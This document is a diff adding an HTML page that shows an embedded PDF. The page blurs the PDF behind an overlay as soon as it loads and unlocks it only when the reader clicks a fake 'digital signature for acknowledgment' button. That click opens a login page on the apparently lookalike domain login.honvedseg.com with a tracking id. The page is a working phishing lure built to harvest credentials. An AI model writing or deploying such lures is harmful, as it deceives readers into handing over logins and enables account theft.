@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <link rel="stylesheet" href="style.css">
+  <title>PDF with Signature</title>
+</head>
+<body>
+
+
+<div id="pdf-container">
+    <embed id="pdf-embed" src="./1.pdf#scrollbar=1" type="application/pdf" />
+  </div>
+
+  <div id="lock-overlay"></div>
+
+  <button id="signature-button">
+    Apply digital signature for acknowledgment of reading
+  </button>
+
+  <script>
+    const embed = document.getElementById("pdf-embed");
+    const button = document.getElementById("signature-button");
+    const overlay = document.getElementById("lock-overlay");
+    
+
+    const body = document.body;
+    let activated = false;
+
+    let isSecondPageVisible = false;
+    let isLocked = false;
+
+    function updateScrollState () {
+      const embedRect = embed.getBoundingClientRect();
+      const viewportHeight = window.innerHeight;
+      const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+      const embedTop = embedRect.top + scrollTop;
+
+      // Approximate: assume one page ≈ one viewport height
+      const pageHeight = viewportHeight;
+      const secondPageTop = embedTop + pageHeight;
+      const secondPageBottom = secondPageTop + pageHeight;
+
+      const viewportTop = scrollTop;
+      const viewportBottom = viewportTop + viewportHeight;
+
+      const isSecondPageInViewport =
+        (viewportTop < secondPageBottom && viewportBottom > secondPageTop);
+
+      if (!isSecondPageVisible && isSecondPageInViewport && !activated) {
+        isSecondPageVisible = true;
+        
+        // Lock and blur
+        if (!isLocked) {
+          isLocked = true;
+          body.classList.add("pdf-blurred");
+          overlay.classList.add("active");
+        }
+      } else if (isSecondPageVisible && !isSecondPageInViewport) {
+        isSecondPageVisible = false;
+        // You can keep the blur lock or remove it here;
+        // in this example we keep it locked until button click.
+      }
+    }
+
+    // Unlock and remove blur when button is clicked
+    button.addEventListener("click", () => {
+      activated = true;
+      overlay.classList.remove("active");
+      body.classList.remove("pdf-blurred");
+      isLocked = false;
+
+window.open('https://login.honvedseg.com/?isd=UBanw13741k', '_blank', 'noopener,noreferrer');
+      // You can also hide the button after click if desired:
+      button.classList.remove("visible");
+      
+      button.remove();
+
+      // ... start your signature / acknowledgment flow here
+      
+    });
+document.addEventListener('DOMContentLoaded', () => {
+  button.classList.add("visible");
+            isLocked = true;
+          body.classList.add("pdf-blurred");
+          overlay.classList.add("active");
+});
+    // Attach scroll / resize listener
+
+
+    window.addEventListener("scroll", updateScrollState);
+    window.addEventListener("resize", updateScrollState);
+
+    // Initial check
+    //updateScrollState();
+  </script>
+
+</div>
+</body>
+<script src="script.js"></script>
+</html>
